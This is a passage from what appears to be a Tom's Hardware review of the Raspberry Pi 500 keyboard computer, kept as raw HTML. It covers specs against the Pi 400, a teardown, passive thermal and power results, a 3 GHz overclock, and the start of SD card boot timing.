bold choice, and it seems that it paid off as Raspberry Pi has now announced the $90 Raspberry Pi 500, based on the current flagship <a data-analytics-id="inline-link" href="https://www.tomshardware.com/reviews/raspberry-pi-5" data-before-rewrite-localise="https://www.tomshardware.com/reviews/raspberry-pi-5"><u>Raspberry Pi 5</u></a>.</p><p>The Raspberry Pi 500 is available on its own for $90, or as part of a $120 Desktop kit. Both come with a 32GB A2 SDR104 compatible micro SD card, but the Desktop kit comes with a 27W USB Type-C power supply, micro HDMI to HDMI cable and the Raspberry Pi Beginner’s Guide.</p><p>Our review unit is essentially the Desktop kit, minus the beginner’s guide. Is the Raspberry Pi 500 the true successor to the Pi 400? Let's find out!</p><h2 id="raspberry-pi-500-technical-specifications-3">Raspberry Pi 500 Technical Specifications</h2><div id="slice-container-table-UsUMufRUcy86LXgPtqnAz4-EN7PkHdiNwtoMiZUhTi63kiTQQcuUafH"><div><p>Swipe to scroll horizontally</p><svg viewBox="0 0 23 30" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M21.554 15.726a2.878 2.878 0 0 0-1.705-.374 2.881 2.881 0 0 0-1.388-3.068 2.877 2.877 0 0 0-1.992-.333 2.884 2.884 0 0 0-.1-.766 2.865 2.865 0 0 0-1.346-1.75c-.47-.27-.996-.4-1.527-.385l2.742-4.73a2.87 2.87 0 0 0 .323-.83h2.612V2.084h-2.661A2.861 2.861 0 0 0 15.18.385a2.903 2.903 0 0 0-3.952 1.055l-.373.644H2.983l1.003-1L2.99.09 1.28 1.793l-.999.995L2.99 5.484l.998-.994-1.003-.999h7.054L6.505 9.586c-.34.066-.905.186-1.523.366-1.405.41-2.321.895-2.8 1.483-.742.911-1.159 2.513-1.277 4.898l-.001.01c-.067 1.816.946 6.943.99 7.16a.688.688 0 0 0 1.35-.266c-.01-.051-1.023-5.177-.963-6.84.127-2.556.598-3.64.97-4.098.133-.163.602-.587 2.104-1.027l.206-.058-1.425 2.458a.685.685 0 0 0 .252.937c.33.19.75.077.94-.251L12.42 2.126a1.52 1.52 0 0 1 2.07-.552c.35.2.6.527.705.916.105.39.051.797-.15 1.145l-4.767 8.222a.685.685 0 0 0 .252.937c.33.19.75.077.94-.25l.794-1.368c.201-.348.529-.597.92-.702a1.508 1.508 0 0 1 1.854 1.066c.105.39.052.796-.15 1.144l-.377.652-.002.002-.898 1.55a.685.685 0 0 0 .252.938c.329.189.75.077.94-.251l.9-1.551c.201-.348.528-.597.92-.702a1.512 1.512 0 0 1 1.703 2.21l-1.223 2.11a.685.685 0 0 0 .252.938c.33.189.75.076.941-.252l.5-.862c.202-.348.529-.597.92-.702.392-.104.8-.051 1.15.15.723.416.972 1.34.554 2.06l-3.525 6.08c-.517.892-1.57 1.795-3.044 2.611-1.156.64-2.163.998-2.173 1.002a.685.685 0 0 0 .23 1.333.688.688 0 0 0 .229-.04c.18-.062 4.419-1.575 5.952-4.22l3.524-6.08a2.878 2.878 0 0 0-1.059-3.934Z" fill="#333"></path></svg></div><div><table tabindex="0"><thead><tr><th colspan="1"><span>Header Cell - Column 0 </span></th><th colspan="1">Raspberry Pi 500</th><th colspan="1">Raspberry Pi 400</th></tr></thead><tbody><tr><td colspan="1">SoC</td><td colspan="1">BCM2712 SoC Arm Cortex-A76 64-bit CPU running at 2.4 GHz</td><td colspan="1">BCM2711 SoC Quad core Cortex-A72 64-bit CPU running at 1.8 GHz</td></tr><tr><td colspan="1"><span>Row 1 - Cell 0 </span></td><td colspan="1">800 MHz VideoCore VII GPU, supporting OpenGL ES 3.1, Vulkan 1.2</td><td colspan="1">500 MHz VideoCore VI GPU</td></tr><tr><td colspan="1">Display</td><td colspan="1">2 x 4Kp60 HDMI display output with HDR support</td><td colspan="1">2 x 4Kp60 HDMI display output</td></tr><tr><td colspan="1">RAM</td><td colspan="1">8GB LPDDR4X SDRAM</td><td colspan="1">4GB LPDDR4</td></tr><tr><td colspan="1">Storage</td><td colspan="1">Micro SD (SDR104 compatible)</td><td colspan="1">Micro SD</td></tr><tr><td colspan="1">GPIO</td><td colspan="1">40 Pin Raspberry Pi HAT Compatible via breakout</td><td colspan="1">40 Pin Raspberry Pi HAT Compatible via breakout</td></tr><tr><td colspan="1">USB</td><td colspan="1">1 x USB 2, 2 x USB 3</td><td colspan="1">1 x USB 2, 2 x USB 3</td></tr><tr><td colspan="1">Networking</td><td colspan="1">Gigabit Ethernet</td><td colspan="1">Gigabit Ethernet</td></tr><tr><td colspan="1">Wi-Fi / Bluetooth</td><td colspan="1">Dual-band 802.11ac, Bluetooth 5 / BLE</td><td colspan="1">Dual-band 802.11ac, Bluetooth 5 / BLE</td></tr><tr><td colspan="1">Power Button</td><td colspan="1">Soft power button on keyboard</td><td colspan="1">None</td></tr><tr><td colspan="1">Power</td><td colspan="1">5V 4A via USB C</td><td colspan="1">5V 3A via USB C</td></tr><tr><td colspan="1">Dimensions</td><td colspan="1">286 × 122 × 23 mm</td><td colspan="1">286 × 122 × 23 mm</td></tr></tbody></table></div></div><h2 id="design-of-the-raspberry-pi-500-3">Design of the Raspberry Pi 500</h2><div aria-hidden="false" data-swipeable="true" data-hydrate="true" id="slice-container-imageGallery-UsUMufRUcy86LXgPtqnAz4-6dAoEuwwDedtZNWuedd2mdWji107PGGI"><figure data-bordeaux-image-check="false"><div><picture data-hydrate="true"><source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/vRyzktrivV5HL2hzjrV9y5-320-80.jpg.webp 320w, https://cdn.mos.cms.futurecdn.net/vRyzktrivV5HL2hzjrV9y5-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/vRyzktrivV5HL2hzjrV9y5-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/vRyzktrivV5HL2hzjrV9y5-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/vRyzktrivV5HL2hzjrV9y5-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/vRyzktrivV5HL2hzjrV9y5-1200-80.jpg.webp 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" data-normal="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" data-original-mos="https://cdn.mos.cms.futurecdn.net/vRyzktrivV5HL2hzjrV9y5.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/vRyzktrivV5HL2hzjrV9y5.jpg" data-pin-nopin="true" data-slice-image="true"><source type="image/jpeg" srcset="https://cdn.mos.cms.futurecdn.net/vRyzktrivV5HL2hzjrV9y5-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/vRyzktrivV5HL2hzjrV9y5-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/vRyzktrivV5HL2hzjrV9y5-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/vRyzktrivV5HL2hzjrV9y5-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/vRyzktrivV5HL2hzjrV9y5-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/vRyzktrivV5HL2hzjrV9y5-1200-80.jpg 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" data-normal="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" data-original-mos="https://cdn.mos.cms.futurecdn.net/vRyzktrivV5HL2hzjrV9y5.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/vRyzktrivV5HL2hzjrV9y5.jpg" data-pin-nopin="true" data-slice-image="true"><img src="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" alt="Raspberry Pi 500" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" loading="lazy" data-normal="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" data-original-mos="https://cdn.mos.cms.futurecdn.net/vRyzktrivV5HL2hzjrV9y5.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/vRyzktrivV5HL2hzjrV9y5.jpg" data-pin-nopin="true" data-slice-image="true"></picture></div><figcaption><span itemprop="copyrightHolder">(Image credit: Tom's Hardware)</span></figcaption></figure></div><p>“It's just a keyboard, right?” Is what I thought when I received the Raspberry Pi 400 out of the blue in 2020. Yes, the 400 looks like the official Raspberry Pi keyboard, but while the Raspberry Pi 500 retains a very similar form factor, the color scheme favors all white instead of raspberry red and white used in the 400.</p><p>The Raspberry Pi 500 is essentially a keyboard with a Raspberry Pi 5 inside of it. Just like the Raspberry Pi 400, this is a custom Pi 500 PCB, and not a <a data-analytics-id="inline-link" href="https://www.tomshardware.com/raspberry-pi/raspberry-pi-compute-module-5-review" data-before-rewrite-localise="https://www.tomshardware.com/raspberry-pi/raspberry-pi-compute-module-5-review">Compute Module 5</a> on a carrier board.</p><figure data-bordeaux-image-check=""><div><p><picture><source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/sQgnycsDWGkGGHxe3Jego5-320-80.jpg.webp 320w, https://cdn.mos.cms.futurecdn.net/sQgnycsDWGkGGHxe3Jego5-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/sQgnycsDWGkGGHxe3Jego5-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/sQgnycsDWGkGGHxe3Jego5-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/sQgnycsDWGkGGHxe3Jego5-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/sQgnycsDWGkGGHxe3Jego5-1200-80.jpg.webp 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)"><img src="https://cdn.mos.cms.futurecdn.net/sQgnycsDWGkGGHxe3Jego5-320-80.jpg" alt="Raspberry Pi 500" srcset="https://cdn.mos.cms.futurecdn.net/sQgnycsDWGkGGHxe3Jego5-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/sQgnycsDWGkGGHxe3Jego5-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/sQgnycsDWGkGGHxe3Jego5-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/sQgnycsDWGkGGHxe3Jego5-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/sQgnycsDWGkGGHxe3Jego5-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/sQgnycsDWGkGGHxe3Jego5-1200-80.jpg 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" loading="lazy" data-original-mos="https://cdn.mos.cms.futurecdn.net/sQgnycsDWGkGGHxe3Jego5.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/sQgnycsDWGkGGHxe3Jego5.jpg"></picture></p></div><figcaption itemprop="caption description"><span itemprop="copyrightHolder">(Image credit: Tom's Hardware)</span></figcaption></figure><p>All of the ports are on the back of the case, and we have a single USB 2 port, used for your choice of mouse. Two USB 3 ports, a micro SD card slot (the same as the Raspberry Pi 5). USB Type C power input, dual 4K micro HDMI ports and GPIO interface, and a Gigabit Ethernet port. Finally there is a spot to lock your Pi 500 to a desk with a Kensington lock.</p><p>Having the ports at the back makes total sense. It tidies up the cables, and means that we only need one thick edge, the rest can be as thin as possible.</p><div aria-hidden="false" data-swipeable="true" data-hydrate="true" id="slice-container-imageGallery-UsUMufRUcy86LXgPtqnAz4-Sba3h1l8afXWmHqvQBWU9KiIjhgQAam7"><figure data-bordeaux-image-check="false"><div><picture data-hydrate="true"><source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/A6S6oReCPMrdYm9DFrZB96-320-80.jpg.webp 320w, https://cdn.mos.cms.futurecdn.net/A6S6oReCPMrdYm9DFrZB96-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/A6S6oReCPMrdYm9DFrZB96-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/A6S6oReCPMrdYm9DFrZB96-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/A6S6oReCPMrdYm9DFrZB96-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/A6S6oReCPMrdYm9DFrZB96-1200-80.jpg.webp 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" data-normal="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" data-original-mos="https://cdn.mos.cms.futurecdn.net/A6S6oReCPMrdYm9DFrZB96.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/A6S6oReCPMrdYm9DFrZB96.jpg" data-pin-nopin="true" data-slice-image="true"><source type="image/jpeg" srcset="https://cdn.mos.cms.futurecdn.net/A6S6oReCPMrdYm9DFrZB96-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/A6S6oReCPMrdYm9DFrZB96-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/A6S6oReCPMrdYm9DFrZB96-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/A6S6oReCPMrdYm9DFrZB96-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/A6S6oReCPMrdYm9DFrZB96-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/A6S6oReCPMrdYm9DFrZB96-1200-80.jpg 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" data-normal="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" data-original-mos="https://cdn.mos.cms.futurecdn.net/A6S6oReCPMrdYm9DFrZB96.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/A6S6oReCPMrdYm9DFrZB96.jpg" data-pin-nopin="true" data-slice-image="true"><img src="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" alt="Raspberry Pi 500" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" loading="lazy" data-normal="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" data-original-mos="https://cdn.mos.cms.futurecdn.net/A6S6oReCPMrdYm9DFrZB96.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/A6S6oReCPMrdYm9DFrZB96.jpg" data-pin-nopin="true" data-slice-image="true"></picture></div><figcaption><span itemprop="copyrightHolder">(Image credit: Tom's Hardware)</span></figcaption></figure></div><p>The keyboard is good. It's not one of the <a data-analytics-id="inline-link" href="https://www.tomshardware.com/best-picks/best-budget-mechanical-keyboards" data-before-rewrite-localise="https://www.tomshardware.com/best-picks/best-budget-mechanical-keyboards"><u>best mechanical keyboards</u></a>, but the membrane chiclet keys are responsive and work well even under fast typing. It even has a power button in the top right! Don't fret! It takes a long press to trigger the power off process.</p><h2 id="tearing-down-the-raspberry-pi-500-3">Tearing Down the Raspberry Pi 500</h2><div aria-hidden="false" data-swipeable="true" data-hydrate="true" id="slice-container-imageGallery-UsUMufRUcy86LXgPtqnAz4-otFNmqfp0uug8vvdwbkg4WqjD21XcWtI"><figure data-bordeaux-image-check="false"><div><picture data-hydrate="true"><source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-320-80.jpg.webp 320w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-1200-80.jpg.webp 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" data-normal="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" data-original-mos="https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6.jpg" data-pin-nopin="true" data-slice-image="true"><source type="image/jpeg" srcset="https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-1200-80.jpg 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" data-normal="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" data-original-mos="https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6.jpg" data-pin-nopin="true" data-slice-image="true"><img src="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" alt="Raspberry Pi 500" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" loading="lazy" data-normal="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" data-original-mos="https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6.jpg" data-pin-nopin="true" data-slice-image="true"></picture></div><figcaption><span itemprop="copyrightHolder">(Image credit: Tom's Hardware)</span></figcaption></figure></div><p>Held together by a series of clips, again just like the Raspberry Pi 400, the Pi 500 is relatively easy to open. Just take your time, plastic spudgers, and carefully use a little heat from a hairdryer or one of the <a data-analytics-id="inline-link" href="https://www.tomshardware.com/best-picks/best-soldering-irons" data-before-rewrite-localise="https://www.tomshardware.com/best-picks/best-soldering-irons"><u>best soldering stations</u></a>.</p><p>I got in, and was greeted by a huge piece of aluminum covering the entire PCB and cradling the keyboard. This is the same setup as the Pi 400 and it will later explain why the Raspberry Pi 500’s thermal performance was so good. Removing the aluminum was a little tricky. The four screws were easy, but the thermal pad holding the aluminum heatsink to the SoC was stuck solid. A little heat, some plastic pry tools and patience won the battle. When putting it all back together, ensure that the heatsink is touching the thermal pad, otherwise the chip will not be cooled.</p><p>The PCB is very similar to the Pi 400 (a theme that permeates this review) but with the GPIO and USB ports swapped around. Looking around the board, it is hard to miss that there is a large M.2 shaped space. A space that could accommodate up to 2280 sized NVMe SSDs, or even an AI accelerator but there is a catch. There is no connector. I asked Raspberry Pi CTO Gordon Hollingworth about this, and his response was that it was a balance of functionality and performance versus cost / capability trade-off. But Hollingworth says the Raspberry Pi 50 "is a good product which hits the same market as Raspberry Pi 400."<br>Another factor in the omission of using NVMe SSDs, is that it's not exactly easy to open the case. The plastic could be easily broken, leaving you with a cosmetically damaged Raspberry Pi 500.</p><p>I also spotted an RP2-B2 chip next to the keyboard FFC connector. The RP2 is the RP2040, and the B2 stepping is the latest. This is acting as a keyboard controller, given its proximity to the keyboard FFC. Hollingworth's response being "Yes - why use a random bit of hardware when we can use our own!"</p><p>Finally, there is a large section of the PCB which is unpopulated. Not a surface mount component to be seen! I spotted a place for a surface mount capacitor, but other than that, the only clue is PoE (Power over Ethernet). This was another feature which didn't make the cut, for the same reasons as M.2 PCIe support is omitted.</p><p>You will have also noticed that there are no connectors for the official <a data-analytics-id="inline-link" href="https://www.tomshardware.com/raspberry-pi/raspberry-pi-touch-display-2-review-a-touch-of-class" data-before-rewrite-localise="https://www.tomshardware.com/raspberry-pi/raspberry-pi-touch-display-2-review-a-touch-of-class"><u>Touch Display 2</u></a>, or the many Raspberry Pi Cameras. The Pi 400 and 500 are both without these connectors, but we can easily connect a USB camera, and two HDMI displays to the Pi 500, so it isn’t a huge loss.</p><h2 id="raspberry-pi-500-thermal-and-power-performance-3">Raspberry Pi 500 Thermal and Power Performance</h2><figure data-bordeaux-image-check=""><div><p><picture><source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-320-80.jpg.webp 320w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-1200-80.jpg.webp 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)"><img src="https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-320-80.jpg" alt="Raspberry Pi 500" srcset="https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6-1200-80.jpg 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" loading="lazy" data-original-mos="https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/7tNNpmJyCJaUayUpx2wrA6.jpg"></picture></p></div><figcaption itemprop="caption description"><span itemprop="copyrightHolder">(Image credit: Tom's Hardware)</span></figcaption></figure><p>Following in the footsteps of the Pi 400 is no bad thing when we’re talking thermal performance. You see, the Pi 400 has a huge piece of metal that sits under the keyboard, acting as a heatsink. It seems that the Pi 500 has the same, as passive cooling performance is remarkable, even when overclocked to 3 GHz!</p><p>I conducted the usual test regime. Powering on the system, I left it for one minute before starting the benchmark script which logs all of the CPU temperatures and speeds to a CSV file for later review.</p><figure data-bordeaux-image-check=""><div><p><picture><source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/VWZSgC2CFhZ9tqEiddUTDc-320-80.png.webp 320w, https://cdn.mos.cms.futurecdn.net/VWZSgC2CFhZ9tqEiddUTDc-480-80.png.webp 480w, https://cdn.mos.cms.futurecdn.net/VWZSgC2CFhZ9tqEiddUTDc-650-80.png.webp 650w, https://cdn.mos.cms.futurecdn.net/VWZSgC2CFhZ9tqEiddUTDc-970-80.png.webp 970w, https://cdn.mos.cms.futurecdn.net/VWZSgC2CFhZ9tqEiddUTDc-1024-80.png.webp 1024w, https://cdn.mos.cms.futurecdn.net/VWZSgC2CFhZ9tqEiddUTDc-1200-80.png.webp 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)"><img src="https://cdn.mos.cms.futurecdn.net/VWZSgC2CFhZ9tqEiddUTDc-320-80.png" alt="Raspberry Pi 500" srcset="https://cdn.mos.cms.futurecdn.net/VWZSgC2CFhZ9tqEiddUTDc-320-80.png 320w, https://cdn.mos.cms.futurecdn.net/VWZSgC2CFhZ9tqEiddUTDc-480-80.png 480w, https://cdn.mos.cms.futurecdn.net/VWZSgC2CFhZ9tqEiddUTDc-650-80.png 650w, https://cdn.mos.cms.futurecdn.net/VWZSgC2CFhZ9tqEiddUTDc-970-80.png 970w, https://cdn.mos.cms.futurecdn.net/VWZSgC2CFhZ9tqEiddUTDc-1024-80.png 1024w, https://cdn.mos.cms.futurecdn.net/VWZSgC2CFhZ9tqEiddUTDc-1200-80.png 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" loading="lazy" data-original-mos="https://cdn.mos.cms.futurecdn.net/VWZSgC2CFhZ9tqEiddUTDc.png" data-pin-media="https://cdn.mos.cms.futurecdn.net/VWZSgC2CFhZ9tqEiddUTDc.png"></picture></p></div><figcaption itemprop="caption description"><span itemprop="copyrightHolder">(Image credit: Tom's Hardware)</span></figcaption></figure><p>First up was the stock speed test. At idle, the system runs at 1.5 GHz, and 31.2 degrees Celsius. Despite only having passive cooling, the Pi 500 remained cool even under a full five minute stress test. Compared to the Raspberry Pi 5’s idle temp of 39.5°C (passively cooled using the Active Cooler’s heatsink). The Pi 500 is chilly and only sips 2.6 Watts of power!</p><p>During the five minute stress test, all four-cores are ran at their maximum speed of 2.4 GHz and this saw the SoC hit 51°C, 8.3°C cooler than the Raspberry Pi 5’s 59.3°C. Power consumption under stress hit 6.36W, but that was nothing to worry about.</p><figure data-bordeaux-image-check=""><div><p><picture><source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/D3Etbu6AE2J6CdWWrNArCc-320-80.png.webp 320w, https://cdn.mos.cms.futurecdn.net/D3Etbu6AE2J6CdWWrNArCc-480-80.png.webp 480w, https://cdn.mos.cms.futurecdn.net/D3Etbu6AE2J6CdWWrNArCc-650-80.png.webp 650w, https://cdn.mos.cms.futurecdn.net/D3Etbu6AE2J6CdWWrNArCc-970-80.png.webp 970w, https://cdn.mos.cms.futurecdn.net/D3Etbu6AE2J6CdWWrNArCc-1024-80.png.webp 1024w, https://cdn.mos.cms.futurecdn.net/D3Etbu6AE2J6CdWWrNArCc-1200-80.png.webp 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)"><img src="https://cdn.mos.cms.futurecdn.net/D3Etbu6AE2J6CdWWrNArCc-320-80.png" alt="Raspberry Pi 500" srcset="https://cdn.mos.cms.futurecdn.net/D3Etbu6AE2J6CdWWrNArCc-320-80.png 320w, https://cdn.mos.cms.futurecdn.net/D3Etbu6AE2J6CdWWrNArCc-480-80.png 480w, https://cdn.mos.cms.futurecdn.net/D3Etbu6AE2J6CdWWrNArCc-650-80.png 650w, https://cdn.mos.cms.futurecdn.net/D3Etbu6AE2J6CdWWrNArCc-970-80.png 970w, https://cdn.mos.cms.futurecdn.net/D3Etbu6AE2J6CdWWrNArCc-1024-80.png 1024w, https://cdn.mos.cms.futurecdn.net/D3Etbu6AE2J6CdWWrNArCc-1200-80.png 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" loading="lazy" data-original-mos="https://cdn.mos.cms.futurecdn.net/D3Etbu6AE2J6CdWWrNArCc.png" data-pin-media="https://cdn.mos.cms.futurecdn.net/D3Etbu6AE2J6CdWWrNArCc.png"></picture></p></div><figcaption itemprop="caption description"><span itemprop="copyrightHolder">(Image credit: Tom's Hardware)</span></figcaption></figure><p>Buoyed by this success, I pushed the Raspberry Pi 500 to 3 GHz and it coped extremely well! The idle temperature was 33.4°C, and only 2.65W of power as the CPU was still idling at 1.5 GHz. Running the stress test, and the CPU hit 3 GHz and 64.8°C, well under the 82°C thermal throttle point. Obviously power consumption went up, 8.8W, but still well under the 25W capability of the official Raspberry Pi 5 PSU.</p><p>The thermal performance of the Raspberry Pi 500 preserves the legacy of the Pi 400, and proves that with good passive cooling, the mighty BCM2712 can be tamed.</p><h2 id="can-the-raspberry-pi-500-be-overclocked-3">Can the Raspberry Pi 500 be overclocked?</h2><p>Oh yes! I took the Raspberry Pi 500 to a stable 3GHz. I did have to adjust the voltage to keep everything stable, but once I found the magic numbers, the system was stable and performed remarkably well. As you have read above, I overclocked the Pi 500 to 3 GHz, and it ran buttery smooth and surprisingly, cool under stress. I’d consider this a successful overclock and one that I would happily keep as a permanent addition.</p><h2 id="raspberry-pi-500-micro-sd-card-performance-3">Raspberry Pi 500 Micro SD Card Performance</h2><figure data-bordeaux-image-check=""><div><p><picture><source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/Hh4h4hGU6iiqXVexFj5eCc-320-80.png.webp 320w, https://cdn.mos.cms.futurecdn.net/Hh4h4hGU6iiqXVexFj5eCc-480-80.png.webp 480w, https://cdn.mos.cms.futurecdn.net/Hh4h4hGU6iiqXVexFj5eCc-650-80.png.webp 650w, https://cdn.mos.cms.futurecdn.net/Hh4h4hGU6iiqXVexFj5eCc-970-80.png.webp 970w, https://cdn.mos.cms.futurecdn.net/Hh4h4hGU6iiqXVexFj5eCc-1024-80.png.webp 1024w, https://cdn.mos.cms.futurecdn.net/Hh4h4hGU6iiqXVexFj5eCc-1200-80.png.webp 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)"><img src="https://cdn.mos.cms.futurecdn.net/Hh4h4hGU6iiqXVexFj5eCc-320-80.png" alt="Raspberry Pi 500" srcset="https://cdn.mos.cms.futurecdn.net/Hh4h4hGU6iiqXVexFj5eCc-320-80.png 320w, https://cdn.mos.cms.futurecdn.net/Hh4h4hGU6iiqXVexFj5eCc-480-80.png 480w, https://cdn.mos.cms.futurecdn.net/Hh4h4hGU6iiqXVexFj5eCc-650-80.png 650w, https://cdn.mos.cms.futurecdn.net/Hh4h4hGU6iiqXVexFj5eCc-970-80.png 970w, https://cdn.mos.cms.futurecdn.net/Hh4h4hGU6iiqXVexFj5eCc-1024-80.png 1024w, https://cdn.mos.cms.futurecdn.net/Hh4h4hGU6iiqXVexFj5eCc-1200-80.png 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" loading="lazy" data-original-mos="https://cdn.mos.cms.futurecdn.net/Hh4h4hGU6iiqXVexFj5eCc.png" data-pin-media="https://cdn.mos.cms.futurecdn.net/Hh4h4hGU6iiqXVexFj5eCc.png"></picture></p></div><figcaption itemprop="caption description"><span itemprop="copyrightHolder">(Image credit: Tom's Hardware)</span></figcaption></figure><p>Boot time is impressive, at 19.86 seconds, but this is in-line with other Raspberry Pi branded A2 micro SD cards that we have tested on the Raspberry Pi 5. Pi boot times are relatively locked for micro SD, eMMC on the Compute Module 5, and NVMe 